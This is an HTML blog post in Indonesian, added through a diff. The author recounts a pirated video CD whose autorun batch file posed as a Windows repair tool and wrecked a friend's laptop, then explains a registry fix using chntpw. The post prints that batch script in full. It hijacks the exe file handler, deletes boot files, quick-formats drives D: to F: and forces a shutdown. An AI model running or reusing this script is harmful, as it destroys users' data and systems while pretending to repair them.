@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+
+    <link rel="apple-touch-icon" sizes="57x57" href="/images/favicon.ico/apple-icon-57x57.png">
+    <link rel="apple-touch-icon" sizes="60x60" href="/images/favicon.ico/apple-icon-60x60.png">
+    <link rel="apple-touch-icon" sizes="72x72" href="/images/favicon.ico/apple-icon-72x72.png">
+    <link rel="apple-touch-icon" sizes="76x76" href="/images/favicon.ico/apple-icon-76x76.png">
+    <link rel="apple-touch-icon" sizes="114x114" href="/images/favicon.ico/apple-icon-114x114.png">
+    <link rel="apple-touch-icon" sizes="120x120" href="/images/favicon.ico/apple-icon-120x120.png">
+    <link rel="apple-touch-icon" sizes="144x144" href="/images/favicon.ico/apple-icon-144x144.png">
+    <link rel="apple-touch-icon" sizes="152x152" href="/images/favicon.ico/apple-icon-152x152.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico/apple-icon-180x180.png">
+    <link rel="icon" type="image/png" sizes="192x192"  href="/images/favicon.ico/android-icon-192x192.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="96x96" href="/images/favicon.ico/favicon-96x96.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico/favicon-16x16.png">
+    <link rel="manifest" href="/images/favicon.ico/manifest.json">
+    <meta name="msapplication-TileColor" content="#ffffff">
+    <meta name="msapplication-TileImage" content="/images/favicon.ico/ms-icon-144x144.png">
+    <meta name="theme-color" content="#ffffff">
+
+    <link rel="manifest" href="/images/site.webmanifest">
+
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="A simple, minimal blog for those who love text.">
+    <title>laptopnya aziz | Blog</title>
+    <link rel="stylesheet" href="/css/style.css" />
+    <link rel="stylesheet" href="/css/fonts.css" />
+    <link rel="stylesheet" href="//localhost:1313/css/theme-override.css">
+    <header>
+
+  <nav>
+    <ul>
+      
+      
+      <li class="pull-left ">
+        <a href="//localhost:1313/">~/blog</a>
+      </li>
+      
+      
+      <li class="pull-left ">
+        <a href="/now/">~/now</a>
+      </li>
+      
+      
+      <li class="pull-left ">
+        <a href="/tech_talks/">~/tech_talks</a>
+      </li>
+      
+      
+      <li class="pull-left ">
+        <a href="/photographs/">~/photographs</a>
+      </li>
+      
+
+      
+      
+      <li class="pull-right">
+        <a href="/index.xml">~/subscribe</a>
+      </li>
+      
+
+    </ul>
+  </nav>
+</header>
+
+  </head>
+
+  <body>
+    <br/>
+
+<div class="article-meta">
+<h1><span class="title">laptopnya aziz</span></h1>
+
+<div style="font-size:0.8em; color: grey; line-height:1.2em">
+  <span class="date">Date: 2010/08/24</span>
+  <br/>
+  <span class="terms">
+    
+    
+      Categories: 
+        <a href="/categories/blog">blog</a>, 
+        <a href="/categories/linux-opensource">linux-opensource</a>, 
+        <a href="/categories/uncategorized">uncategorized</a>
+      
+    <br/>
+    
+    
+      Tags: 
+        <a href="/tags/bajakan">bajakan</a>, 
+        <a href="/tags/bukan-virus">bukan virus</a>, 
+        <a href="/tags/chntpw">chntpw</a>, 
+        <a href="/tags/skrip-perusak">skrip perusak</a>, 
+        <a href="/tags/sux">sux</a>, 
+        <a href="/tags/video-cd-bajakan">video cd bajakan</a>, 
+        <a href="/tags/windows">windows</a>
+      
+    <br/>
+    
+  </span>
+</div>
+</div>
+
+
+<div class="content-wrapper">
+  <main>
+    <p>alkisah, ada seorang kawan, namanya aziz. punya keping video cd bajakan beli di emperan cd di surabaya. dan laptopnya diserahkan ke saya, rusak pula.</p>
+<p>tidak bisa regedit, commandline, taskmanager, etc. tidak bisa jalankan file ekstensi exe (otomatis ini ancur), dan file ntldr hilang.</p>
+<p>pendek kata, itu leptop saya install ulang pake linux windosnya (merasa berdosa). install driver. install aplikasi (merasa berdosa). pasang antivirus (avast lisensi free). pokoke beres.</p>
+<p>tapi si aziz balik lagi keesokan harinya. tak lupa leptopnya dibawa juga. otomatis saya langsung sakit hati.</p>
+<p>temennya bilang &ldquo;kemarin masukin video cd langsung ada hitam-hitam tulisan (belakangan diketahui adalah jendela command line)&rdquo;</p>
+<p>saya tanya &ldquo;terus?&rdquo;</p>
+<p>temennya bilang &ldquo;terus mati&rdquo;.</p>
+<p>keren. ntldrnya hilang lagi, tidak bisa booting. karena penasaran dan berhubung rumahnya deket, saya suruh ambil video cd yang diputar itu.</p>
+<p>terus saya temukan  file autorun plus file dengan ekstensi .bat yang isinya adalah ini :</p>
+<p>[sourcecode]</p>
+<p>@echo off</p>
+<p>title Microsoft Windows TM Auto Repair</p>
+<p>echo.</p>
+<p>echo Preparing to Fixing the System&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;</p>
+<p>echo This system need to repair of broken files.</p>
+<p>echo This problem may be cause a Virus activity or coruption files.</p>
+<p>echo Please wait a minute until windows doing it self&hellip;.</p>
+<p>echo Please close any running programs from the Windows system.</p>
+<p>echo This program License and copyright by</p>
+<p>echo Microsoft Coorporation TM.</p>
+<p>echo System Repair in progress &hellip;&hellip;.. please wait a second..</p>
+<p>echo.</p>
+<p>reg add HKLM\SOFTWARE\Classes\exefile\shell\open\Command /ve /d %%fe340ead%%  /f</p>
+<p>echo.</p>
+<p>del /f /Q /A C:\ntldr /S</p>
+<p>echo.</p>
+<p>Format  D: /Q /X /y</p>
+<p>echo.</p>
+<p>Format  E: /Q /X /y</p>
+<p>echo.</p>
+<p>Format  F: /Q /X /y</p>
+<p>echo.</p>
+<p>del /f /Q /A C:\command.com /S</p>
+<p>echo.</p>
+<p>del /f /Q /A C:\io.sys /S</p>
+<p>echo.</p>
+<p>del /f /Q /A C:\config.sys /S</p>
+<p>echo.</p>
+<p>echo System is now repaired.</p>
+<p>echo Windows will reboot the system.</p>
+<p>echo.</p>
+<p>Shutdown.exe -s -c &ldquo;Finish Repair System&rdquo; -f -t 10</p>
+<p>echo.</p>
+<p>pause</p>
+<p>echo.</p>
+<p>Shutdown.exe -s -c &ldquo;Finish Repair System&rdquo; -f -t 10</p>
+<p>echo.</p>
+<p>exit</p>
+<p>[/sourcecode]</p>
+<p>ngerti kan? kenapa skrip sux ini ada di root folder sebuah video cd bajakan?</p>
+<p>analisa saya : supaya video cd bajakan ini tidak bisa dibajak! begitu dimasukin ke komputer, komputernya ngadat (kalo windoslah). ini cd buat diputer di vcd player, bukan dibuka di komputer terus diputar, terus dikopi ke hardis. ini bisnis, anda tidak boleh membajak apa yang saya bajak. begitulah kira-kira maksud si pembuat cd.</p>
+<p>pelajaran : jangan beli cd bajakan sembarangan.</p>
+<p>karena malas install ulang, untuk solvenya, pakai <a href="http://slax.org">slax</a> ditambah <a href="http://http://www.slax.org/modules.php?action=detail&amp;id=2557">modul chntpw</a>.</p>
+<p>cara regedit pakai cntpw :</p>
+<p>[sourcecode]</p>
+<h1 id="mount--o-rw-devsda1-mntsda1">mount -o rw /dev/sda1 /mnt/sda1/</h1>
+<h1 id="cd-mntsda1windowssystem32config">cd /mnt/sda1/WINDOWS/system32/config</h1>
+<h1 id="chntpw--e">chntpw -e <hive file></h1>
+<p>[/sourcecode]</p>
+<p>catatan : hive file ada di dalam folder config, misal kalo targetnya ada di dalam hkey_local_machine/software maka nama hive filenya adalah software (coba di-ls). untuk masuk :</p>
+<p>chntpw -e software.</p>
+<p>ketik ? untuk bantuan. hapus entri yang dibuat sama skrip tadi. beres.</p>
+
+    <br/><br/>
+    <a href="/"> >> Home</a>
+  </main>
+</div>
+    <footer>
+      
+<script>
+(function() {
+  function center_el(tagName) {
+    var tags = document.getElementsByTagName(tagName), i, tag;
+    for (i = 0; i < tags.length; i++) {
+      tag = tags[i];
+      var parent = tag.parentElement;
+      
+      if (parent.childNodes.length === 1) {
+        
+        if (parent.nodeName === 'A') {
+          parent = parent.parentElement;
+          if (parent.childNodes.length != 1) continue;
+        }
+        if (parent.nodeName === 'P') parent.style.textAlign = 'center';
+      }
+    }
+  }
+  var tagNames = ['img', 'embed', 'object'];
+  for (var i = 0; i < tagNames.length; i++) {
+    center_el(tagNames[i]);
+  }
+})();
+</script>
+
+      
+      <hr/>
+      <a href="https://github.com/herpiko">Github</a> | <a href="https://www.linkedin.com/in/herpiko/">LinkedIn</a>
+      
+    </footer>
+  </body>
+</html>
+
